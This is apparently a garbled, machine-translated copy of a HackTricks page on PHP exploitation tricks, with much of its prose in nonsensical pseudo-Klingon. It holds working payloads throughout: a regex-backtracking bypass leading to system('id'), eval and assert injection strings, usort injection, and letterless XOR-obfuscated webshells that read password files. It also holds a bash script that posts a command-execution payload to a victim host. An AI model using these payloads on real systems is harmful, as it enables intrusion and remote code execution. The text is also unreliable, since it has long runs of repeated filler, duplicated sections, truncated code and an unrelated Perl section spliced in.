(ghItlh bypass vItlhutlh PHP 5.2.5 'ej PHP 7.3.15 DaH jImej) \
vaj 'ej vItlhutlh 'ej **bypass** 'e' vItlhutlh 'ej **won't be able to process it** 'ej **bypass** 'e' vItlhutlh 'ej **large input** **valid** 'ej `preg_match()` 'e' vItlhutlh 'ej **can send** 'e'. Qatlh, 'ej 'oH JSON 'e' blacklisting 'e' vItlhutlh 'ej:
```bash
payload = '{"cmd": "ls -la", "injected": "'+ "a"*1000001 + '"}'
```
#### ReDoS Bypass

Trick from: [https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223](https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223)


<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

In short the problem happens because the `preg_*` functions in PHP builds upon the [PCRE library](http://www.pcre.org/). In PCRE certain regular expressions are matched by using a lot of recursive calls, which uses up a lot of stack space. It is possible to set a limit on the amount of recursions allowed, but in PHP this limit [defaults to 100.000](http://php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit) which is more than fits in the stack.

[This Stackoverflow thread](http://stackoverflow.com/questions/7620910/regexp-in-preg-match-function-returning-browser-error) was also linked in the post where it is talked more in depth about this issue. Our task was now clear:\
**Send an input that would make the regex do 100\_000+ recursions, causing SIGSEGV, making the `preg_match()` function return `false` thus making the application think that our input is not malicious, throwing the surprise at the end of the payload something like `{system(<verybadcommand>)}` to get SSTI --> RCE --> flag :)**.

Well, in regex terms, we're not actually doing 100k "recursions", but instead we're counting "backtracking steps", which as the [PHP documentation](https://www.php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit) states it defaults to 1\_000\_000 (1M) in the `pcre.backtrack_limit` variable.\
To reach that, `'X'*500_001` will result in 1 million backtracking steps (500k forward and 500k backwards):
```python
payload = f"@dimariasimone on{'X'*500_001} {{system('id')}}"
```
### Type Juggling for PHP obfuscation

#### tlhIngan Hol translation:

### PHP obfuscation lay'Ha' jatlh:

#### tlhIngan Hol translation:
```php
$obfs = "1"; //string "1"
$obfs++; //int 2
$obfs += 0.2; //float 2.2
$obfs = 1 + "7 IGNORE"; //int 8
$obfs = "string" + array("1.1 striiing")[0]; //float 1.1
$obfs = 3+2 * (TRUE + TRUE); //int 7
$obfs .= ""; //string "7"
$obfs += ""; //int 7
```
## Execute After Redirect (EAR)

If PHP is redirecting to another page but no **`die`** or **`exit`** function is **called after the header `Location`** is set, the PHP continues executing and appending the data to the body:

---

## Execute After Redirect (EAR)

If PHP is redirecting to another page but no **`die`** or **`exit`** function is **called after the header `Location`** is set, the PHP continues executing and appending the data to the body:
```php
<?php
// In this page the page will be read and the content appended to the body of
// the redirect response
$page = $_GET['page'];
header('Location: /index.php?page=default.html');
readfile($page);
?>
```
## Qapla'!

* **register\_globals**: **PHP < 4.1.1.1** vaj vaj **register\_globals** vay' (be'Hom vay' mimicked) vaj. vaj global variables **$\_GET** vaj vay' $\_GET\["param"]="1234" vaj, **$param** vaj **access** vay' (HTTP parameters vay' jatlh) vaj **variables** vay' **overwrite** vaj vay' **code** vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay' vay'
```php
$cont=71; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
False

$cont=72; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
True
```
### HTTP headers bypass abusing PHP errors

**If a PHP page is printing errors and echoing back some input provided by the user**, the user can make the PHP server print back some **content long enough** so when it tries to **add the headers** into the response the server will throw and error.\
In the following scenario the **attacker made the server throw some big errors**, and as you can see in the screen when php tried to **modify the header information, it couldn't** (so for example the CSP header wasn't sent to the user):

![](<../../../.gitbook/assets/image (465).png>)

## Code execution

**system("ls");**\
**\`ls\`;**\
**shell\_exec("ls");**

[Check this for more useful PHP functions](php-useful-functions-disable\_functions-open\_basedir-bypass/)

### **RCE via** **preg\_replace()**
```php
preg_replace(pattern,replace,base)
preg_replace("/a/e","phpinfo()","whatever")
```
**replace** argument vItlh **code** jatlh vItlhutlh.\
**preg\_replace** vItlhutlh **option** **deprecated** **PHP 5.5.0**.

### **RCE via Eval()**
```
'.system('uname -a'); $dummy='
'.system('uname -a');#
'.system('uname -a');//
'.phpinfo().'
<?php phpinfo(); ?>
```
### **RCE via Assert()**

**tlhIngan Hol translation:**

**Assert()** vItlhutlh: 

**php** vaj **assert()** vItlhutlh **code** **execute** **ghaH** **string** **written** **allow** **you**. **true** **false** **return** **order** **alter** **execution** **depending**. **user variable** **usually** **string** **middle** **insert**. **Example**:\
`assert("strpos($_GET['page']),'..') === false")` --> **RCE** **get** **case** **you** **do**:
```
?page=a','NeVeR') === false and system('ls') and strpos('a
```
**ghItlh** **code** **syntax** **break** **jatlh** **payload** **add** **'ej** **qay'be'** **fix** **jatlh**. **logic operations** **use** **'ej** "**and"** **%26%26** **|**. **Note** **'ej**, "**or"** **||** **jatlh** **doesn't** **work** **because** **first condition** **true** **payload** **won't** **execute**. **same way** **";"** **doesn't** **work** **because** **payload** **won't** **execute**.

**Other option** **string** **add** **execution** **command**: `'.highlight_file('.passwd').'`

**Other option** **internal code** **have** **if** **variable** **modify** **execution** **alter**: `$file = "hola"`

### **RCE via usort()**

**function** **array** **items** **sort** **specific function** **use** **is**.\
**abuse** **function** **To**:
```php
<?php usort(VALUE, "cmp"); #Being cmp a valid function ?>
VALUE: );phpinfo();#

<?php usort();phpinfo();#, "cmp"); #Being cmp a valid function ?>
```

```php
<?php
function foo($x,$y){
usort(VALUE, "cmp");
}?>
VALUE: );}[PHP CODE];#

<?php
function foo($x,$y){
usort();}phpinfo;#, "cmp");
}?>
```
**//** qarDaq **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//** **//
```php
exec, shell_exec, system, passthru, eval, popen
unserialize, include, file_put_cotents
$_COOKIE | if #This mea
```
**Deobfuscating PHP code**

**web**[ **www.unphp.net**](http://www.unphp.net) **to deobfuscate php code.**

## PHP Wrappers & Protocols

PHP Wrappers ad protocols could allow you to **bypass write and read protections** in a system and compromise it. For [**more information check this page**](../../../pentesting-web/file-inclusion/#lfi-rfi-using-php-wrappers-and-protocols).

## Xdebug unauthenticated RCE

If you see that **Xdebug** is **enabled** in a `phpconfig()` output you should try to get RCE via [https://github.com/nqxcode/xdebug-exploit](https://github.com/nqxcode/xdebug-exploit)

## Variable variables
```php
$x = 'Da';
$$x = 'Drums';

echo $x; //Da
echo $$x; //Drums
echo $Da; //Drums
echo "${Da}"; //Drums
echo "$x ${$x}"; //Da Drums
echo "$x ${Da}"; //Da Drums
```
## RCE abusing new $\_GET\["a"]\($\_GET\["b"])

If in a page you can **create a new object of an arbitrary class** you might be able to obtain RCE, check the following page to learn how:

{% content-ref url="php-rce-abusing-object-creation-new-usd_get-a-usd_get-b.md" %}
[php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md](php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md)
{% endcontent-ref %}

## Execute PHP without letters

[https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/](https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/)

### Using octal

## RCE abusing new $\_GET\["a"]\($\_GET\["b"])

If in a page you can **create a new object of an arbitrary class** you might be able to obtain RCE, check the following page to learn how:

{% content-ref url="php-rce-abusing-object-creation-new-usd_get-a-usd_get-b.md" %}
[php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md](php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md)
{% endcontent-ref %}

## Execute PHP without letters

[https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/](https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/)

### Using octal
```php
$_="\163\171\163\164\145\155(\143\141\164\40\56\160\141\163\163\167\144)"; #system(cat .passwd);
```
### **XOR**

#### **Klingon Translation:**

### **XOR**

#### **Klingon Translation:**

### **XOR**
```php
$_=("%28"^"[").("%33"^"[").("%34"^"[").("%2c"^"[").("%04"^"[").("%28"^"[").("%34"^"[").("%2e"^"[").("%29"^"[").("%38"^"[").("%3e"^"["); #show_source
$__=("%0f"^"!").("%2f"^"_").("%3e"^"_").("%2c"^"_").("%2c"^"_").("%28"^"_").("%3b"^"_"); #.passwd
$___=$__; #Could be not needed inside eval
$_($___); #If ¬¢___ not needed then $_($__), show_source(.passwd)
```
### XOR jatlh shell code

[**'ej writeup**](https://mgp25.com/ctf/Web-challenge/) vItlhutlhla' easy shellcode vItlhutlhla' jatlh:
```php
$_="`{{{"^"?<>/"; // $_ = '_GET';
${$_}[_](${$_}[__]); // $_GET[_]($_GET[__]);

$_="`{{{"^"?<>/";${$_}[_](${$_}[__]); // $_ = '_GET'; $_GET[_]($_GET[__]);
```
So, if you can **execute arbitrary PHP without numbers and letters** you can send a request like the following abusing that payload to execute arbitrary PHP:

---

**nuqneH**, **PHP** jatlh **loDpu'** 'ej **loDpu'** jatlh **PHP** **execute** **'ej** **payload** **abusing** **following** **request** **send** **can**:

---
```
POST: /action.php?_=system&__=cat+flag.php
Content-Type: application/x-www-form-urlencoded

comando=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);
```
For a more in depth explanation check [https://ctf-wiki.org/web/php/php/#preg\_match](https://ctf-wiki.org/web/php/php/#preg\_match)

### XOR Shellcode (inside eval)

### XOR Shellcode (eval jatlh)
```bash
#!/bin/bash

if [[ -z $1 ]]; then
echo "USAGE: $0 CMD"
exit
fi

CMD=$1
CODE="\$_='\
```

```php
lt;>/'^'{{{{';\${\$_}[_](\${\$_}[__]);" `$_='
```

```php
lt;>/'^'{{{{'; --> _GET` `${$_}[_](${$_}[__]); --> $_GET[_]($_GET[__])` `So, the function is inside $_GET[_] and the parameter is inside $_GET[__]` http --form POST "http://victim.com/index.php?_=system&__=$CMD" "input=$CODE"
```
### Perl like

#### Description

Perl is a high-level, general-purpose programming language that is often used for web development. It is known for its powerful text processing capabilities and its ability to handle complex data structures. In this section, we will explore some Perl-like tricks that can be useful for web application penetration testing.

#### 1. Command Execution

Perl provides several ways to execute commands from within a script. One common method is to use the backtick operator (`), which allows you to run a command and capture its output. For example:

```perl
my $output = `ls -la`;
print $output;
```

This code will execute the `ls -la` command and print the output to the screen. It is important to note that using the backtick operator can be dangerous if user input is directly passed to the command, as it can lead to command injection vulnerabilities.

#### 2. File Inclusion

Perl allows you to include the contents of one file into another using the `do` function. This can be useful for loading configuration files or other scripts. For example:

```perl
do 'config.pl';
```

This code will execute the `config.pl` file and include its contents in the current script. It is important to ensure that the included file is trusted and does not contain any malicious code that could be executed.

#### 3. Regular Expressions

Perl has powerful support for regular expressions, which can be used for pattern matching and text manipulation. The `=~` operator is used to match a string against a regular expression. For example:

```perl
if ($string =~ /pattern/) {
    print "Match found!";
}
```

This code will check if the variable `$string` matches the specified pattern and print "Match found!" if it does. Regular expressions can be used for tasks such as input validation, data extraction, and filtering.

#### 4. Web Requests

Perl provides several modules for making web requests, such as `LWP::UserAgent` and `HTTP::Request`. These modules can be used to send HTTP requests, handle cookies, and parse HTML responses. For example:

```perl
use LWP::UserAgent;

my $ua = LWP::UserAgent->new;
my $response = $ua->get('https://example.com');

if ($response->is_success) {
    print $response->content;
}
```

This code uses the `LWP::UserAgent` module to send a GET request to `https://example.com` and print the response content if the request is successful. These modules can be useful for testing web applications and automating tasks such as form submission.

#### Conclusion

Perl-like tricks can be valuable tools for web application penetration testing. By leveraging Perl's powerful features, you can enhance your testing capabilities and uncover vulnerabilities in web applications. However, it is important to use these tricks responsibly and ensure that proper security measures are in place to protect against potential exploits.
```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```
<details>

<summary><strong>qaStaHvIS AWS hacking vItlh</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
